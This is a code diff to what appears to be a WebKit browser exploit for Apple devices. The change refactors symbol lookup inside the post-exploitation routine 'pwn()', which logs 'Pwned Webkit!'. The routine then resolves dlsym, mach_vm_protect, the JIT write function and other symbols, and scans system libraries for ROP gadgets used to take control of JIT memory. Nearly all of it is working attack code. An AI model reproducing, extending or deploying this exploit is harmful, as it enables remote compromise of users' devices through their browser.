@@ -182,11 +182,16 @@ function obtain_dylibs_base(base, nameList) {
 }
 
 
-function find_symbol_address(macho_base, name) {
+function resolve_symbol_addresses(macho_base, names) {
+    var results = [];
+    for (var k = 0; k < names.length; k++) {
+        results[k] = null;
+    }
+    var found = 0;
+
     var ncmds = read32(Add(macho_base, 0x10));
     var ptr = Add(macho_base, 0x20);
-
-    var symtab_cmd = 0;
+    var symtab_cmd = null;
     for (var i = 0; i < ncmds; i++) {
         var lc = ptr;
         var lc_cmd = read32(lc);
@@ -235,20 +240,27 @@ function find_symbol_address(macho_base, name) {
     var sym_table = Add(linkedit_base, read32(Add(symtab_cmd, 8)));
     var nsyms = read32(Add(symtab_cmd, 0xc));
 
-    for (var i = 0; i < nsyms; i++) {
+    for (var i = 0; i < nsyms && found < names.length; i++) {
         var symtable_n_value = read64(Add(sym_table, i * 16 + 8));
-        if(symtable_n_value) {
-            var strtab_offset = read32(Add(sym_table, i * 16 + 0));
+        if (!symtable_n_value) {
+            continue;
+        }
 
-            var current_symbol_name = readString(Add(string_table, strtab_offset));
-            if (current_symbol_name === name) {
-               	var addr = symtable_n_value;
-               	return new Int64(Sub(addr, Sub(text_segment_vmaddr, 0x100000000)) & 0xfffffffff);
+        var strtab_offset  = read32(Add(sym_table, i * 16 + 0));
+        var current_symbol_name = readString(Add(string_table, strtab_offset));
+
+        for (var j = 0; j < names.length; j++) {
+            if (results[j] === null && current_symbol_name === names[j]) {
+                var addr = symtable_n_value;
+                results[j] = new Int64(Sub(addr, Sub(text_segment_vmaddr, 0x100000000)) & 0xfffffffff);
+                found++;
+                log(`[+] ${names[j]}: ${results[j]}`);
+                break;
             }
         }
     }
 
-    return 0;
+    return results;
 }
 
 function obtain_libcpp_base(vtab_addr) {
@@ -433,12 +445,12 @@ function pwn() {
     log(`[+] Pwned Webkit! Running post-exploitation...\n\n`);
 
     // 1. Obtain libc++.1 base
-    log(`[i] [Stage 1] Obtaining libc++.1 base...`);
+    log(`[Stage 1] Obtaining libc++.1 base...`);
     var libcpp1_base = obtain_libcpp_base(vtab_addr);
     log(`[+] Obtained libc++.1 base: ${libcpp1_base}`);
 
     // 2. Obtain Libs Base
-    log(`[i] [Stage 2] Obtaining other dylibs base...`);
+    log(`[Stage 2] Obtaining other dylibs base...`);
     const dylibNames = [
         "/usr/lib/system/libdyld.dylib",
         "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore",
@@ -460,42 +472,96 @@ function pwn() {
     var airplayreceiver_base = dylibBases[5];
     var libsystem_platform_base = dylibBases[6];
     var libsystem_kernel_base = dylibBases[7];
-    var libsystem_c = dylibBases[8];
+    var libsystem_c_base = dylibBases[8];
+    log(`[+] Obtained other dylibs base.`);
 
-    //find symbols..
-    var dlsym_addr = find_symbol_address(libdyld_base, "__dlsym");
-    log(`[+] dlsym: ${dlsym_addr}`);
 
-    var jitWriteSeparateHeaps_addr = find_symbol_address(jsc_base, "___ZN3JSC29jitWriteSeparateHeapsFunctionE");
-    log(`[+] jitWriteSeparateHeaps: ${jitWriteSeparateHeaps_addr}`);
+    // 3. Obtain func offsets from symbol name
+    log(`[Stage 3] Obtaining func offsets from symbol name...`);
 
-    var longjmp_addr = find_symbol_address(libsystem_platform_base, "___longjmp");
-    log(`[+] longjmp: ${longjmp_addr}`);
+    var jsc_symbols = [
+        "___ZN3JSC29jitWriteSeparateHeapsFunctionE",
+        "___ZN3JSC36startOfFixedExecutableMemoryPoolImplEv"
+    ];
+    var symbolsAddr = resolve_symbol_addresses(jsc_base, jsc_symbols);
+    var jitWriteSeparateHeaps_addr = symbolsAddr[0];
+    var startOfFixedExecutableMemoryPoolImpl_addr = symbolsAddr[1];
 
-    var usleep_addr = find_symbol_address(libsystem_c, "__usleep");
-    log(`[+] usleep: ${usleep_addr}`);
+    var libdyld_symbols = [
+        "__dlsym",
+        "___dyld_process_info_notify_release"
+    ]
+    symbolsAddr = resolve_symbol_addresses(libdyld_base, libdyld_symbols);
+    var dlsym_addr = symbolsAddr[0];
+    var dyld_process_info_notify_release_addr = symbolsAddr[1];
 
-    var mach_vm_protect_addr = find_symbol_address(libsystem_kernel_base, "__mach_vm_protect");
-    log(`[+] mach_vm_protect: ${mach_vm_protect_addr}`);
+    var libsysplatform_symbols = [
+        "___longjmp"
+    ]
+    symbolsAddr = resolve_symbol_addresses(libsystem_platform_base, libsysplatform_symbols);
+    var longjmp_addr = symbolsAddr[0];
 
-    var mach_task_self_addr = find_symbol_address(libsystem_kernel_base, "__mach_task_self_");
-    log(`[+] mach_task_self_: ${mach_task_self_addr}`);
+    var libsystemc_symbols = [
+        "__usleep"
+    ]
+    symbolsAddr = resolve_symbol_addresses(libsystem_c_base, libsystemc_symbols);
+    var usleep_addr = symbolsAddr[0];
 
-    var startOfFixedExecutableMemoryPoolImpl_addr = find_symbol_address(jsc_base, "___ZN3JSC36startOfFixedExecutableMemoryPoolImplEv");
-    log(`[+] startOfFixedExecutableMemoryPoolImpl: ${startOfFixedExecutableMemoryPoolImpl_addr}`);
+    var libsystemkernel_symbols = [
+        "__mach_vm_protect",
+        "__mach_task_self_",
+        "__mach_vm_map"
+    ]
+    symbolsAddr = resolve_symbol_addresses(libsystem_kernel_base, libsystemkernel_symbols);
+    var mach_vm_protect_addr = symbolsAddr[0];
+    var mach_task_self_addr = symbolsAddr[1];
+    var mach_vm_map_addr = symbolsAddr[2];
 
+    var security_symbols = [
+        "__SSLGetPeerDomainName"
+    ]
+    symbolsAddr = resolve_symbol_addresses(security_base, security_symbols);
+    var SSLGetPeerDomainName_addr = symbolsAddr[0];
+
+    var airplayreceiver_symbols = [
+        "__APAdvertiserGetTypeID"
+    ]
+    symbolsAddr = resolve_symbol_addresses(airplayreceiver_base, airplayreceiver_symbols);
+    var APAdvertiserGetTypeID_addr = symbolsAddr[0];
+
+    var libcpp1_symbols = [
+        "___ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEElsEt",
+        "___ZNKSt3__18time_putIcNS_19ostreambuf_iteratorIcNS_11char_traitsIcEEEEE3putES4_RNS_8ios_baseEcPK2tmPKcSC_"
+    ]
+    symbolsAddr = resolve_symbol_addresses(libcpp1_base, libcpp1_symbols);
+    var znst3_addr = symbolsAddr[0];
+    var znkst3_addr = symbolsAddr[1];
+    log(`[+] Obtained func offsets.`);
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    // 4. LEFT THINGS... NEED TO BE CLEAN code...
     var __MergedGlobals_52_addr = follow_adrpLdr(Add(jsc_base, startOfFixedExecutableMemoryPoolImpl_addr));
     __MergedGlobals_52_addr = Sub(__MergedGlobals_52_addr, jsc_base);
     log(`[+] __MergedGlobals_52: ${__MergedGlobals_52_addr}`);
-
-    return;
+    
 
     
     
     //FIND GADGETS...
     // 1. STACKLOADER
-    var mach_vm_map_addr = find_symbol_address(libsystem_kernel_base, "__mach_vm_map");
-    log(`[+] mach_vm_map: ${mach_vm_map_addr}`);
     try_count = 0;
     var stackloader = Add(libsystem_kernel_base, mach_vm_map_addr);
     while (true) {
@@ -526,7 +592,7 @@ function pwn() {
     log(`[+] stackloader: ${stackloader}`);
 
     // 2. LDRX8
-    var SSLGetPeerDomainName_addr = find_symbol_address(security_base, "__SSLGetPeerDomainName");
+    // var SSLGetPeerDomainName_addr = find_symbol_address(security_base, "__SSLGetPeerDomainName");
     log(`[+] SSLGetPeerDomainName_addr: ${SSLGetPeerDomainName_addr}`);
     try_count = 0;
     var ldrx8 = Add(security_base, SSLGetPeerDomainName_addr);
@@ -561,7 +627,7 @@ function pwn() {
 
 
     // 3. DISPATCH
-    var APAdvertiserGetTypeID_addr = find_symbol_address(airplayreceiver_base, "__APAdvertiserGetTypeID");
+    // var APAdvertiserGetTypeID_addr = find_symbol_address(airplayreceiver_base, "__APAdvertiserGetTypeID");
     log(`[+] APAdvertiserGetTypeID_addr: ${APAdvertiserGetTypeID_addr}`);
     try_count = 0;
     var dispatch = Add(airplayreceiver_base, APAdvertiserGetTypeID_addr);
@@ -592,7 +658,7 @@ function pwn() {
 
 
     // 4. MOVX4
-    var znst3_addr = find_symbol_address(libcpp1_base, "___ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEElsEt");
+    // var znst3_addr = find_symbol_address(libcpp1_base, "___ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEElsEt");
     log(`[+] znst3_addr: ${znst3_addr}`);
     try_count = 0;
     var movx4 = Add(libcpp1_base, znst3_addr);
@@ -619,7 +685,7 @@ function pwn() {
 
 
     // 5. REGLOADER
-    var znkst3_addr = find_symbol_address(libcpp1_base, "___ZNKSt3__18time_putIcNS_19ostreambuf_iteratorIcNS_11char_traitsIcEEEEE3putES4_RNS_8ios_baseEcPK2tmPKcSC_");
+    // var znkst3_addr = find_symbol_address(libcpp1_base, "___ZNKSt3__18time_putIcNS_19ostreambuf_iteratorIcNS_11char_traitsIcEEEEE3putES4_RNS_8ios_baseEcPK2tmPKcSC_");
     log(`[+] znkst3_addr: ${znkst3_addr}`);
     try_count = 0;
     var regloader = Add(libcpp1_base, znkst3_addr);
@@ -655,7 +721,7 @@ function pwn() {
 
 
     //OBTAIN DYLD_BASE
-    var dyld_process_info_notify_release_addr = find_symbol_address(libdyld_base, "___dyld_process_info_notify_release");
+    // var dyld_process_info_notify_release_addr = find_symbol_address(libdyld_base, "___dyld_process_info_notify_release");
     log(`[+] dyld_process_info_notify_release_addr: ${dyld_process_info_notify_release_addr}`);
     var __Z27setNotifyMonitoringDyldMainPFvvE_addr = Add(dyld_process_info_notify_release_addr, 4);
 
@@ -704,7 +770,7 @@ function pwn() {
     log(`[i] memPoolEnd = ${memPoolEnd}`);
     log(`[i] jitWriteSeparateHeaps = ${jitWriteSeparateHeaps}`);
     var longjmp = Add(libsystem_platform_base, longjmp_addr);
-    var usleep = Add(libsystem_c, usleep_addr);
+    var usleep = Add(libsystem_c_base, usleep_addr);
     var mach_vm_protect = Add(libsystem_kernel_base, mach_vm_protect_addr);
     var mach_task_self_ = read64(Add(libsystem_kernel_base, mach_task_self_addr));
 
